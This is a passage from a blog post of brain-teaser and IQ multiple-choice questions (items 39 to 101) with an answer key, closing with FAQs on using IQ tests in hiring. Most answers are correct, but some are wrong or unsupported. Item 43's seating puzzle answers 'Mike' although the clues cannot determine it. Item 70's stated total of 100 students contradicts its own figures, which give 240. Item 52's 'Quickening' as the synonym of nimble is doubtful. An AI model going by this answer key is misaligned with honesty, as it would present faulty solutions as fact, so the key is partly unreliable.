<li>A woman shoots her husband, holds him underwater for several minutes, and then hangs him. Yet, shortly after, they are seen dining together happily. How is this possible?</li>
</ol>



<pre class="wp-block-preformatted">Answer: She shot his photograph, developed it and hung it to dry.</pre>



<ol class="wp-block-list" start="40">
<li>Divide 30 by ½ and add 10. What’s the answer?</li>
</ol>



<p>Options:</p>



<p>a) 25<br>b) 35<br>c) 70<br>d) 20</p>



<pre class="wp-block-preformatted">Answer: 70</pre>



<ol class="wp-block-list" start="41">
<li>What number do you get when you multiply all the numbers on a telephone dial?</li>
</ol>



<p>Options:</p>



<p>a) 362280<br>b) 468828<br>c) 0<br>d) None of the above</p>



<pre class="wp-block-preformatted">Answer: 0</pre>



<ol class="wp-block-list" start="42">
<li>Forward, I am heavy. Backward, I am not. What am I?</li>
</ol>



<pre class="wp-block-preformatted">Answer: Ton</pre>



<ol class="wp-block-list" start="43">
<li>Five friends sit in a row. If Sarah is to the left of John and John is to the right of Mike, who is in the middle?</li>
</ol>



<pre class="wp-block-preformatted">Answer: Mike</pre>



<ol class="wp-block-list" start="44">
<li>If two coins are tossed, what is the probability of getting at least one head?</li>
</ol>



<p>Options:</p>



<p>a) 1/4<br>b) 1/2<br>c) 3/4<br>d) 1</p>



<pre class="wp-block-preformatted">Answer: 3/4</pre>



<ol class="wp-block-list" start="45">
<li>The statement has a jumbled word. Read the sentence and find the right word from the options.<br>She DEGILD the ice floor like a pro.</li>
</ol>



<p>Options:</p>



<p>a) GILDED<br>b) GLIDED<br>c) LIDEDG<br>d) GLEIDD</p>



<pre class="wp-block-preformatted">Answer: GLIDED</pre>



<ol class="wp-block-list" start="46">
<li>Find the synonym of the following word.</li>
</ol>



<p>STERILE</p>



<p>Options:</p>



<p>a) Filter<br>b) Barren<br>c) Fertile<br>d) Barren</p>



<pre class="wp-block-preformatted">Answer: Barren</pre>



<ol class="wp-block-list" start="47">
<li>A person who compiles dictionaries</li>
</ol>



<p>Options:</p>



<p>a) Cartographer<br>b) Lexicographer<br>c) Biographer<br>d) Geographer</p>



<pre class="wp-block-preformatted">Answer: Lexicographer</pre>



<ol class="wp-block-list" start="48">
<li>An accurate clock reads 8:00 AM. By how many degrees will the hour hand have turned when it reaches 2:00 PM?</li>
</ol>



<p>Options:</p>



<p>a) 144 degrees<br>b) 180 degrees<br>c) 90 degrees<br>d) 170 degrees</p>



<pre class="wp-block-preformatted">Answer: 180 degrees</pre>



<ol class="wp-block-list" start="49">
<li>Spot the odd one out:</li>
</ol>



<p>8,27,100,64,125,512</p>



<p>Options:</p>



<p>a) 64<br>b) 512<br>c) 100<br>d) 8</p>



<pre class="wp-block-preformatted">Answer: 100</pre>



<ol class="wp-block-list" start="50">
<li>The seats for Mathematics, Physics, and Biology in a school are in the ratio 5:7:8. If the proposal to increase these seats by 40%, 50%, and 75%, respectively, is implemented, what will the new ratio of seats be?</li>
</ol>



<p>Options:</p>



<p>a) 6:7:8<br>b) 2:3:4<br>c) 1:3:2<br>d) 5:4:8</p>



<pre class="wp-block-preformatted">Answer: 2:3:4</pre>



<ol class="wp-block-list" start="51">
<li>A place where coins are made</li>
</ol>



<p>a) Factory<br>b) Mint<br>c) Foundry<br>d) Mill</p>



<pre class="wp-block-preformatted">Answer: Mint</pre>



<ol class="wp-block-list" start="52">
<li>Find the synonym of the following word:</li>
</ol>



<p>Nimble</p>



<p>Options:</p>



<p>a) Quickening<br>b) Clear<br>c) Unrhythmic<br>d) Lively</p>



<pre class="wp-block-preformatted">Answer: Quickening</pre>



<ol class="wp-block-list" start="53">
<li>If 1/3 of 1/4 of a number is 15, then what is 3/10 of that number?</li>
</ol>



<p>Options:</p>



<p>a) 63<br>b) 54<br>c) 100<br>d) 25</p>



<pre class="wp-block-preformatted">Answer: 54</pre>



<ol class="wp-block-list" start="54">
<li>A two-digit number differs from the number formed by reversing its digits by 36. What is the difference between the digits of the original number?</li>
</ol>



<p>Options:</p>



<p>a) 3<br>b) 2<br>c) 4<br>d) Cannot be determined</p>



<pre class="wp-block-preformatted">Answer: 4</pre>



<ol class="wp-block-list" start="55">
<li>Quart is to ounce as yard is to</li>
</ol>



<p>Options:</p>



<p>a) Inch<br>b) Centimeter<br>c) Liter<br>d) Gallon</p>



<pre class="wp-block-preformatted">Answer: Inch</pre>



<ol class="wp-block-list" start="56">
<li>The total age of five children, each born 3 years apart, is 50 years. How old is the youngest child?</li>
</ol>



<p>Options:</p>



<p>a) 8 years<br>b) 10 years<br>c) 4 years<br>d) None of the above</p>



<pre class="wp-block-preformatted">Answer: 4 years</pre>



<ol class="wp-block-list" start="57">
<li>Mutton:Sheep::</li>
</ol>



<p>Options:</p>



<p>a) Pork: Pig<br>b) Lobster: Crustacean<br>c) Chick: Chicken<br>d) Prawn: Curry</p>



<pre class="wp-block-preformatted">Answer: Pork:Pig</pre>



<ol class="wp-block-list" start="58">
<li>January 1, 2006, fell on a Sunday. What day of the week was January 1, 2010?</li>
</ol>



<p>Options:</p>



<p>a) Monday<br>b) Tuesday<br>c) Sunday<br>d) Friday</p>



<pre class="wp-block-preformatted">Answer: Friday</pre>



<ol class="wp-block-list" start="59">
<li>Find the correct spelling</li>
</ol>



<p>Options:</p>



<p>a) Benefited<br>b) Benefitted<br>c) Benifited<br>d) Benefeted</p>



<pre class="wp-block-preformatted">Answer: Benefited</pre>



<ol class="wp-block-list" start="60">
<li>A train 130 meters long, traveling at 45 km/h, crosses a bridge in 30 seconds. What is the length of the bridge?</li>
</ol>



<p>Options:</p>



<p>a) 200m<br>b) 245m<br>c) 300m<br>d) 350m</p>



<pre class="wp-block-preformatted">Answer: 245m</pre>



<ol class="wp-block-list" start="61">
<li>That which cannot be believed</li>
</ol>



<p>Options:</p>



<p>a) Incredible<br>b) Inevitable<br>c) Indelible<br>d) Infamous</p>



<pre class="wp-block-preformatted">Answer: Incredible</pre>



<ol class="wp-block-list" start="62">
<li>A vessel contains a liquid mixture with a ratio of 3 parts water to 5 parts syrup. How much of this mixture should be removed and replaced with water to make the mixture consist of equal parts water and syrup?</li>
</ol>



<p>Options:</p>



<p>a) 1/3<br>b) 3/4<br>c) 2/3<br>d) 1/5</p>



<pre class="wp-block-preformatted">Answer: 1/5</pre>



<ol class="wp-block-list" start="63">
<li>Find the antonym for the word.</li>
</ol>



<p>Commissioned</p>



<p>Options:</p>



<p>a) Finished<br>b) Terminated<br>c) Closed<br>d) Started</p>



<pre class="wp-block-preformatted">Answer: Terminated</pre>



<ol class="wp-block-list" start="64">
<li>Two students took an examination. One scored 9 marks more than the other, and his marks were 56% of the total marks scored by both. What were their individual marks?</li>
</ol>



<p>Options:</p>



<p>a) 42,33<br>b) 30,35<br>c) 41,32<br>d) 39,30</p>



<pre class="wp-block-preformatted">Answer: 42,33</pre>



<ol class="wp-block-list" start="65">
<li>When someone is arrogant and domineering</li>
</ol>



<p>Options:</p>



<p>a) Haughty<br>b) Insolent<br>c) Imperious<br>d) Impressive</p>



<pre class="wp-block-preformatted">Answer: Imperious</pre>



<ol class="wp-block-list" start="66">
<li>A can contains a mixture of two liquids A and B is in the ratio 7 : 5. When 9 liters of mixture are drawn off and the can is filled with B, the ratio of A and B becomes 7 : 9. How many liters of liquid A was contained by the can initially?</li>
</ol>



<p>Options:</p>



<p>a) 20<br>b) 21<br>c) 25<br>d) 30</p>



<pre class="wp-block-preformatted">Answer: 21</pre>



<ol class="wp-block-list" start="67">
<li>Find the synonym for the word:</li>
</ol>



<p>Brief</p>



<p>Options:</p>



<p>a) Short<br>b) Limited<br>c) Lean<br>d) Small</p>



<pre class="wp-block-preformatted">Answer: Short</pre>



<ol class="wp-block-list" start="68">
<li>A family has two grandparents, two parents, and three grandchildren. The grandparents have an average age of 67 years, the parents have an average age of 35 years, and the grandchildren have an average age of 6 years. What is the overall average age of the family?</li>
</ol>



<p>Options:</p>



<p>a) 32 1/7 years<br>b) 31 5/7 years<br>c) 10 years<br>d) None of the above</p>



<pre class="wp-block-preformatted">Answer: 31 5/7 years</pre>



<ol class="wp-block-list" start="69">
<li>The philosophical theory of existence</li>
</ol>



<p>Options:</p>



<p>a) Existentialism<br>b) Syllogism<br>c) Fascism<br>d) Communalism</p>



<pre class="wp-block-preformatted">Answer: Existentialism</pre>



<ol class="wp-block-list" start="70">
<li>In a school, 20% of the students are younger than 8 years. The number of students older than 8 years is three times the number of students who are exactly 8 years old, which is 48. What is the total number of students in the school?</li>
</ol>



<p>Options:</p>



<p>a) 90<br>b) 80<br>c) 100<br>d) 60</p>



<pre class="wp-block-preformatted">Answer: 100</pre>



<ol class="wp-block-list" start="71">
<li>The average weight of a group of 8 people increases by 2.5 kg when one of the group members, who weighs 65 kg, is replaced by a new person. What is the weight of the new person?</li>
</ol>



<p>Options:</p>



<p>a) 75kg<br>b) 80kg<br>c) 80.5kg<br>d) 85kg</p>



<pre class="wp-block-preformatted">Answer: 85kg</pre>



<ol class="wp-block-list" start="72">
<li>A small amount of something</li>
</ol>



<p>Options:</p>



<p>a) Enormous<br>b) Huge<br>c) Smattering<br>d) Jot</p>



<pre class="wp-block-preformatted">Answer: Smattering</pre>



<ol class="wp-block-list" start="73">
<li>In an election with two candidates, one candidate received 55% of the total valid votes. If 20% of the votes were invalid and the total number of votes cast was 7500, how many valid votes did the other candidate receive?</li>
</ol>



<p>Options:</p>



<p>a) 3500<br>b) 2500<br>c) 3700<br>d) 2700</p>



<pre class="wp-block-preformatted">Answer: 2700</pre>



<ol class="wp-block-list" start="74">
<li>The price of Type 1 rice is Rs. 15 per kg, and Type 2 rice is Rs. 20 per kg. If these two types are mixed in the ratio of 2:3, what will be the cost per kg of the resulting mixture?</li>
</ol>



<p>Options:</p>



<p>a) 18<br>b) 18.50<br>c) 80<br>d) 100</p>



<pre class="wp-block-preformatted">Answer: 18</pre>



<p>75. The study of past human activity through material remains</p>



<p>Options:</p>



<p>a) Anthropology<br>b) Archaeology<br>c) Zoology<br>d) Architectural</p>



<pre class="wp-block-preformatted">Answer: Archaeology</pre>



<ol class="wp-block-list" start="76">
<li>Gauri purchased items worth Rs. 25 from a stationery shop, out of which 30 paise was paid as sales tax on taxable items. If the tax rate was 6%, what was the cost of the tax-free items she bought?</li>
</ol>



<p>Options:</p>



<p>a) 17.90<br>b) 19.70<br>c) 18<br>d) 19</p>



<pre class="wp-block-preformatted">Answer: 19.70</pre>



<ol class="wp-block-list" start="77">
<li>Two trains of the same length are moving on parallel tracks in the same direction at speeds of 46 km/h and 36 km/h, respectively. The faster train overtakes the slower train in 36 seconds. What is the length of each train?</li>
</ol>



<p>Options:</p>



<p>a) 72m<br>b) 50m<br>c) 70m<br>d) 60m</p>



<pre class="wp-block-preformatted">Answer: 50m</pre>



<ol class="wp-block-list" start="78">
<li>How many kilograms of sugar priced at Rs. 9 per kg need to be mixed with 27 kg of sugar priced at Rs. 7 per kg so that selling the mixture at Rs. 9.24 per kg results in a 10% profit?</li>
</ol>



<p>Options:</p>



<p>a) 50kg<br>b) 63kg<br>c) 60kg<br>d) 73kg</p>



<pre class="wp-block-preformatted">Answer: 63kg</pre>



<ol class="wp-block-list" start="79">
<li>To formally put an end to a system, law, or practice</li>
</ol>



<p>Options:</p>



<p>a) Abolish<br>b) Exonerate<br>c) Admonish<br>d) Acquiesce</p>



<pre class="wp-block-preformatted">Answer: Abolish</pre>



<ol class="wp-block-list" start="80">
<li>To strongly criticize someone or something</li>
</ol>



<p>s) Eulogize<br>b) Lambaste<br>c) Appraise<br>d) Comment</p>



<pre class="wp-block-preformatted">Answer: Lambaste</pre>



<ol class="wp-block-list" start="81">
<li>A boat takes 8 hours and 48 minutes to travel a certain distance upstream and 4 hours to travel the same distance downstream. What is the ratio of the speed of the boat to the speed of the current?</li>
</ol>



<p>Options:</p>



<p>a) 8:3<br>b) 3:2<br>c) 1:2<br>d) None of the above</p>



<pre class="wp-block-preformatted">Answer: 8:3</pre>



<ol class="wp-block-list" start="82">
<li>In one hour, a boat travels at 11 km/h with the stream and 5 km/h against the stream. What is the speed of the boat in still water (in km/h)?</li>
</ol>



<p>Options:</p>



<p>a) 3km/h<br>b) 2km/h<br>c) 8km/h<br>d) 9km/h</p>



<pre class="wp-block-preformatted">Answer: 8km/h</pre>



<ol class="wp-block-list" start="83">
<li>To confirm or give support to a statement, theory, or finding</li>
</ol>



<p>a) Corroborate<br>b) Contradict<br>c) Repudiate<br>d) Subvert</p>



<pre class="wp-block-preformatted">Answer: Corroborate</pre>



<ol class="wp-block-list" start="84">
<li>To publicly declare someone free from blame or guilt</li>
</ol>



<p>a) Exonerate<br>b) Vindicate<br>c) Reprimand<br>d) Condemn</p>



<pre class="wp-block-preformatted">Answer: Exonerate</pre>



<ol class="wp-block-list" start="85">
<li>Teacher:Student::Doctor:</li>
</ol>



<p>Options:</p>



<p>a) Patient<br>b) Nurse<br>c) Assistant<br>d) None of the above</p>



<pre class="wp-block-preformatted">Answer: Patient</pre>



<ol class="wp-block-list" start="86">
<li>What is the largest four-digit number that is exactly divisible by 88?</li>
</ol>



<p>Options:</p>



<p>a) 9944<br>b) 9988<br>c) 10088<br>d) 8888</p>



<pre class="wp-block-preformatted">Answer: 9944</pre>



<ol class="wp-block-list" start="87">
<li>The difference between the two numbers is 1365. When the larger number is divided by the smaller, the quotient is 6, and the remainder is 15. What is the value of the smaller number?</li>
</ol>



<p>Option:</p>



<p>a) 250<br>b) 370<br>c) 270<br>d) 300</p>



<pre class="wp-block-preformatted">Answer: 270</pre>



<ol class="wp-block-list" start="88">
<li>To avoid something deliberately</li>
</ol>



<p>a) Emulate<br>b) Shun<br>c) Compel<br>d) Retort</p>



<pre class="wp-block-preformatted">Answer: Shun</pre>



<ol class="wp-block-list" start="89">
<li>She has an insatiable love for food:</li>
</ol>



<p>Options:</p>



<p>a) Undesirable<br>b) Unsatisfiable<br>c) Unchanging<br>d) Irrevocable</p>



<pre class="wp-block-preformatted">Answer: Unsatisfiable</pre>



<ol class="wp-block-list" start="90">
<li>What is the sum of the first 45 natural numbers?</li>
</ol>



<p>Options:</p>



<p>a) 1280<br>b) 1035<br>c) 1550<br>d) 1350</p>



<pre class="wp-block-preformatted">Answer: 1035</pre>



<ol class="wp-block-list" start="91">
<li>The difference between a positive proper fraction and its reciprocal is 9/20. What is the fraction?</li>
</ol>



<p>Options:</p>



<p>a) 4/3<br>b) 4/5<br>c) 3/10<br>d) 3/5</p>



<pre class="wp-block-preformatted">Answer: 4/5</pre>



<ol class="wp-block-list" start="92">
<li>A person who honorably discharged from service</li>
</ol>



<p>Options:</p>



<p>a) Emancipated<br>b) Retired<br>c) Emeritus<br>d) Relieved</p>



<pre class="wp-block-preformatted">Answer: Emeritus</pre>



<ol class="wp-block-list" start="93">
<li>Having intellectual tastes</li>
</ol>



<p>Options:</p>



<p>a) Aristocratic<br>b) Sophisticated<br>c) Highbrow<br>d) Elite</p>



<pre class="wp-block-preformatted">Answer: Highbrow</pre>



<ol class="wp-block-list" start="94">
<li>Complete the series:</li>
</ol>



<p>2, 6, 18, 54, …</p>



<p>Options:</p>



<p>a) 148<br>b) 100<br>c) 122<br>d) 162</p>



<pre class="wp-block-preformatted">Answer: 162</pre>



<ol class="wp-block-list" start="95">
<li>Complete the series:</li>
</ol>



<p>5.2,4.8,4.4,4</p>



<p>Options:</p>



<p>a) 3<br>b) 2.5<br>c) 3.6<br>d) 3.5</p>



<pre class="wp-block-preformatted">Answer: 3.6</pre>



<ol class="wp-block-list" start="96">
<li>What five-letter word stays the same when you take away the first, third, and last letters?</li>
</ol>



<pre class="wp-block-preformatted">Answer: EMPTY</pre>



<ol class="wp-block-list" start="97">
<li>The current ages of Sameer and Anand are in the ratio of 5:4. After three years, the ratio of their ages will change to 11:9. What is Anand’s current age in years?</li>
</ol>



<p>Options:</p>



<p>a) 27<br>b) 24<br>c) 30<br>d) 50</p>



<pre class="wp-block-preformatted">Answers: 24</pre>



<ol class="wp-block-list" start="98">
<li>A person having good knowledge and reasoning</li>
</ol>



<p>Options:</p>



<p>a) Intelligent<br>b) Expert<br>c) Intellectual<br>d) Snob</p>



<pre class="wp-block-preformatted">Answer: Intellectual</pre>



<ol class="wp-block-list" start="99">
<li>Prima Facie means</li>
</ol>



<p>Option:</p>



<p>a) As it seems at first sight<br>b) As it is made to seem at first sight<br>c) As it turns out to be at the end<br>d) As it seems to the court after a number of hearings</p>



<pre class="wp-block-preformatted">Answer: As it seems at first sight</pre>



<ol class="wp-block-list" start="100">
<li>Thirty-nine people can repair a road in 12 days, working 5 hours per day. How many days will it take for 30 people, working 6 hours per day, to complete the same work?</li>
</ol>



<p>Options:</p>



<p>a) 10<br>b) 12<br>c) 13<br>d) None of the above</p>



<pre class="wp-block-preformatted">Answer: 13</pre>



<ol class="wp-block-list" start="101">
<li>A camp has food sufficient for either 120 men or 200 children. If 150 children have already had their meal, how many men can be served with the remaining food?</li>
</ol>



<p>Options:</p>



<p>a) 20 men<br>b) 30 men<br>c) 40 men<br>d) 50 men</p>



<pre class="wp-block-preformatted">Answer: 30 men</pre>



<h2 class="wp-block-heading"><span class="ez-toc-section" id="Summary"></span>Summary<span class="ez-toc-section-end"></span></h2>



<p>Brain teaser IQ questions are great for stimulating brain function, and regular practice can significantly improve your score. Strong cognitive abilities are crucial for success in job searches and competitive exams. Best of luck!</p>



<h3 class="wp-block-heading"><span class="ez-toc-section" id="FAQs"></span>FAQs<span class="ez-toc-section-end"></span></h3>



<ol class="wp-block-list">
<li>What are IQ questions?</li>
</ol>



<p>IQ test questions are designed to assess a person&#8217;s cognitive abilities. These tests provide insights into how individuals solve problems on the spot and are often used in competitive exams or to evaluate job applicants.</p>



<ol class="wp-block-list" start="2">
<li>What is the importance of IQ Test Questions in job candidate selection?</li>
</ol>



<p>Employers commonly use IQ tests to screen candidates before advancing them to technical interview stages. These questions provide insights into a candidate&#8217;s critical thinking and analytical abilities, making them an effective tool for assessing potential.</p>



<ol class="wp-block-list" start="3">
<li>What are the different kinds of tests that come under IQ questions?</li>
</ol>



<p>The different types of questions that come under IQ questions like numerical aptitude, verbal reasoning, pattern recognition, anagrams, etc.</p>



<ol class="wp-block-list" start="4">
<li>Are IQ questions the sole test to determine the quality of the job candidate?</li>
</ol>



<p>IQ tests can assess analytical and cognitive skills but don&#8217;t give the full picture of a potential candidate. Creativity and practical skills can&#8217;t be fully evaluated by IQ tests. In conclusion, IQ questions should not be the sole factor when selecting a candidate.</p>



<h3 class="wp-block-heading"><span class="ez-toc-section" id="Further_Reading"></span>Further Reading<span class="ez-toc-section-end"></span></h3>



<ul class="wp-block-list">
<li><a href="https://learnwoo.com/logical-questions-and-answers-to-test-your-iq/">20+ Logical Questions and Answers to Test Your IQ</a></li>



<li><a href="https://learnwoo.com/e-commerce-interview-questions-with-answers/">20+ E-commerce Interview Questions with Answers – A 2024 Guide</a></li>
</ul>
        </div>

        <footer>
            <!-- post pagination -->            <!-- review -->
            <div class="td-post-source-tags">
                <!-- source via -->                <!-- tags --><ul class="td-tags td-post-small-box clearfix"><li><span>TAGS</span></li><li><a href="https://learnwoo.com/tag/blog/">blog</a></li><li><a href="https://learnwoo.com/tag/brain-teasers/">brain teasers</a></li><li><a href="https://learnwoo.com/tag/iq/">IQ</a></li><li><a href="https://learnwoo.com/tag/iq-test/">iq test</a></li><li><a href="https://learnwoo.com/tag/mcq/">mcq</a></li></ul>            </div>

            <div class="td-post-sharing-bottom"><div class="td-post-sharing-classic"><iframe loading="lazy" title="bottomFacebookLike" frameBorder="0" src="about:blank" style="border:none; overflow:hidden; width:auto; height:21px; background-color:transparent;" data-rocket-lazyload="fitvidscompatible" data-lazy-src="https://www.facebook.com/plugins/like.php?href=https://learnwoo.com/brain-teaser-iq-questions-and-answers/&#038;layout=button_count&#038;show_faces=false&#038;width=105&#038;action=like&#038;colorscheme=light&#038;height=21"></iframe><noscript><iframe title="bottomFacebookLike" frameBorder="0" src="https://www.facebook.com/plugins/like.php?href=https://learnwoo.com/brain-teaser-iq-questions-and-answers/&amp;layout=button_count&amp;show_faces=false&amp;width=105&amp;action=like&amp;colorscheme=light&amp;height=21" style="border:none; overflow:hidden; width:auto; height:21px; background-color:transparent;"></iframe></noscript></div><div id="td_social_sharing_article_bottom" class="td-post-sharing td-ps-bg td-ps-notext td-post-sharing-style1 "><div class="td-post-sharing-visible"><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-facebook" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Flearnwoo.com%2Fbrain-teaser-iq-questions-and-answers%2F" title="Facebook" ><div class="td-social-but-icon"><i class="td-icon-facebook"></i></div><div class="td-social-but-text">Facebook</div></a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-twitter" href="https://twitter.com/intent/tweet?text=100%2B+Brain+Teaser+IQ+Questions+and+Answers&url=https%3A%2F%2Flearnwoo.com%2Fbrain-teaser-iq-questions-and-answers%2F&via=learnwoo_com" title="Twitter" ><div class="td-social-but-icon"><i class="td-icon-twitter"></i></div><div class="td-social-but-text">Twitter</div></a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-pinterest" href="https://pinterest.com/pin/create/button/?url=https://learnwoo.com/brain-teaser-iq-questions-and-answers/&amp;media=https://learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png&description=100%2B+Brain+Teaser+IQ+Questions+and+Answers" title="Pinterest" ><div class="td-social-but-icon"><i class="td-icon-pinterest"></i></div><div class="td-social-but-text">Pinterest</div></a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-whatsapp" href="https://api.whatsapp.com/send?text=100%2B+Brain+Teaser+IQ+Questions+and+Answers %0A%0A https://learnwoo.com/brain-teaser-iq-questions-and-answers/" title="WhatsApp" ><div class="td-social-but-icon"><i class="td-icon-whatsapp"></i></div><div class="td-social-but-text">WhatsApp</div></a></div><div class="td-social-sharing-hidden"><ul class="td-pulldown-filter-list"></ul><a class="td-social-sharing-button td-social-handler td-social-expand-tabs" href="#" data-block-uid="td_social_sharing_article_bottom" title="More">
                                    <div class="td-social-but-icon"><i class="td-icon-plus td-social-expand-tabs-icon"></i></div>
                                </a></div></div></div>            <!-- next prev --><div class="td-block-row td-post-next-prev"><div class="td-block-span6 td-post-prev-post"><div class="td-post-next-prev-content"><span>Previous article</span><a href="https://learnwoo.com/the-complete-guide-to-how-to-start-an-online-store/">The Complete Guide to How to Start an Online Store in 2024</a></div></div><div class="td-next-prev-separator"></div><div class="td-block-span6 td-post-next-post"><div class="td-post-next-prev-content"><span>Next article</span><a href="https://learnwoo.com/best-website-builder-for-a-small-business/">Best Website Builder for a Small Business: Free and Paid Options (2025)</a></div></div></div>            <!-- author box --><div class="author-box-wrap"><a href="https://learnwoo.com/author/aswathyajaykumar/" aria-label="author-photo"><img data-del="avatar" alt="Aswathy Ajaykumar" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2096%2096'%3E%3C/svg%3E" class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96' data-lazy-src="https://cdn.learnwoo.com/wp-content/uploads/2024/05/WhatsApp-Image-2024-05-03-at-11.30.43-AM-100x100.jpeg"/><noscript><img data-del="avatar" alt="Aswathy Ajaykumar" src='https://cdn.learnwoo.com/wp-content/uploads/2024/05/WhatsApp-Image-2024-05-03-at-11.30.43-AM-100x100.jpeg' class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96'/></noscript></a><div class="desc"><div class="td-author-name vcard author"><span class="fn"><a href="https://learnwoo.com/author/aswathyajaykumar/">Aswathy Ajaykumar</a></span></div><div class="td-author-description">Creative Content Writer,
Exploring her way into the world of plugins and anything and everything about WordPress and WooCommerce. 
When not exploring, easily bailed out by a good book, a cup of coffee and some humming in between!</div><div class="td-author-social"></div><div class="clearfix"></div></div></div>            <!-- meta --><span class="td-page-meta" itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Aswathy Ajaykumar"><meta itemprop="url" content="https://learnwoo.com/author/aswathyajaykumar/"></span><meta itemprop="datePublished" content="2024-11-22T21:33:30+05:30"><meta itemprop="dateModified" content="2024-11-22T21:40:54+05:30"><meta itemscope itemprop="mainEntityOfPage" itemType="https://schema.org/WebPage" itemid="https://learnwoo.com/brain-teaser-iq-questions-and-answers/"/><span class="td-page-meta" itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><span class="td-page-meta" itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://cdn.learnwoo.com/wp-content/uploads/2018/05/Learnwoo_Logo-design_90-300x67.png"></span><meta itemprop="name" content="LearnWoo"></span><meta itemprop="headline " content="100+ Brain Teaser IQ Questions and Answers"><span class="td-page-meta" itemprop="image" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://cdn.learnwoo.com/wp-content/uploads/2024/11/100-Brain-Teaser.png"><meta itemprop="width" content="1120"><meta itemprop="height" content="630"></span>        </footer>

    </article> <!-- /.post -->

    <div class="td_block_wrap td_block_related_posts tdi_2 td_with_ajax_pagination td-pb-border-top td_block_template_1"  data-td-block-uid="tdi_2" ><script type="rocketlazyloadscript">var block_tdi_2 = new tdBlock();
block_tdi_2.id = "tdi_2";
block_tdi_2.atts = '{"limit":3,"ajax_pagination":"next_prev","live_filter":"cur_post_same_categories","td_ajax_filter_type":"td_custom_related","class":"tdi_2","td_column_number":3,"block_type":"td_block_related_posts","live_filter_cur_post_id":58232,"live_filter_cur_post_author":"31940","block_template_id":"","header_color":"","ajax_pagination_infinite_stop":"","offset":"","td_ajax_preloading":"","td_filter_default_txt":"","td_ajax_filter_ids":"","el_class":"","color_preset":"","ajax_pagination_next_prev_swipe":"","border_top":"","css":"","tdc_css":"","tdc_css_class":"tdi_2","tdc_css_class_style":"tdi_2_rand_style"}';
block_tdi_2.td_column_number = "3";
block_tdi_2.block_type = "td_block_related_posts";
block_tdi_2.post_count = "3";
block_tdi_2.found_posts = "1656";
block_tdi_2.header_color = "";
block_tdi_2.ajax_pagination_infinite_stop = "";
block_tdi_2.max_num_pages = "552";
tdBlocksArray.push(block_tdi_2);
</script><h4 class="td-related-title td-block-title"><a id="tdi_3" class="td-related-left td-cur-simple-item" data-td_filter_value="" data-td_block_id="tdi_2" href="#">RELATED ARTICLES</a><a id="tdi_4" class="td-related-right" data-td_filter_value="td_related_more_from_author" data-td_block_id="tdi_2" href="#">MORE FROM AUTHOR</a></h4><div id=tdi_2 class="td_block_inner">

	<div class="td-related-row">

	<div class="td-related-span4">

        <div class="td_module_related_posts td-animation-stack td_mod_related_posts">
            <div class="td-module-image">
                <div class="td-module-thumb"><a href="https://learnwoo.com/understanding-llms-txt-a-complete-guide/"  rel="bookmark" class="td-image-wrap " title="Understanding llms.txt: A Complete Guide for WordPress Users" ><img width="218" height="150" class="entry-thumb" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20218%20150'%3E%3C/svg%3E"  data-lazy-srcset="https://cdn.learnwoo.com/wp-content/uploads/2025/07/llms.txt-218x150.jpg 218w, https://cdn.learnwoo.com/wp-content/uploads/2025/07/llms.txt-100x70.jpg 100w" data-lazy-sizes="(max-width: 218px) 100vw, 218px"  alt="Understanding llms.txt" title="Understanding llms.txt: A Complete Guide for WordPress Users" data-lazy-src="https://cdn.learnwoo.com/wp-content/uploads/2025/07/llms.txt-218x150.jpg" /><noscript><img width="218" height="150" class="entry-thumb" src="https://cdn.learnwoo.com/wp-content/uploads/2025/07/llms.txt-218x150.jpg"  srcset="https://cdn.learnwoo.com/wp-content/uploads/2025/07/llms.txt-218x150.jpg 218w, https://cdn.learnwoo.com/wp-content/uploads/2025/07/llms.txt-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px"  alt="Understanding llms.txt" title="Understanding llms.txt: A Complete Guide for WordPress Users" /></noscript></a></div>                            </div>
            <div class="item-details">
                <h3 class="entry-title td-module-title"><a href="https://learnwoo.com/understanding-llms-txt-a-complete-guide/"  rel="bookmark" title="Understanding llms.txt: A Complete Guide for WordPress Users">Understanding llms.txt: A Complete Guide for WordPress Users</a></h3>            </div>
        </div>
        
	</div> <!-- ./td-related-span4 -->

	<div class="td-related-span4">

        <div class="td_module_related_posts td-animation-stack td_mod_related_posts">
            <div class="td-module-image">
                <div class="td-module-thumb"><a href="https://learnwoo.com/what-is-google-ai-mode/"  rel="bookmark" class="td-image-wrap " title="Google AI Mode: A Complete Guide" ><img width="218" height="150" class="entry-thumb" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20218%20150'%3E%3C/svg%3E"  data-lazy-srcset="https://cdn.learnwoo.com/wp-content/uploads/2025/07/Google-AI-mode-218x150.jpg 218w, https://cdn.learnwoo.com/wp-content/uploads/2025/07/Google-AI-mode-100x70.jpg 100w" data-lazy-sizes="(max-width: 218px) 100vw, 218px"  alt="Understanding Google AI Mode" title="Google AI Mode: A Complete Guide" data-lazy-src="https://cdn.learnwoo.com/wp-content/uploads/2025/07/Google-AI-mode-218x150.jpg" /><noscript><img width="218" height="150" class="entry-thumb" src="https://cdn.learnwoo.com/wp-content/uploads/2025/07/Google-AI-mode-218x150.jpg"  srcset="https://cdn.learnwoo.com/wp-content/uploads/2025/07/Google-AI-mode-218x150.jpg 218w, https://cdn.learnwoo.com/wp-content/uploads/2025/07/Google-AI-mode-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px"  alt="Understanding Google AI Mode" title="Google AI Mode: A Complete Guide" /></noscript></a></div>                            </div>
            <div class="item-details">
                <h3 class="entry-title td-module-title"><a href="https://learnwoo.com/what-is-google-ai-mode/"  rel="bookmark" title="Google AI Mode: A Complete Guide">Google AI Mode: A Complete Guide</a></h3>            </div>
        </div>
        
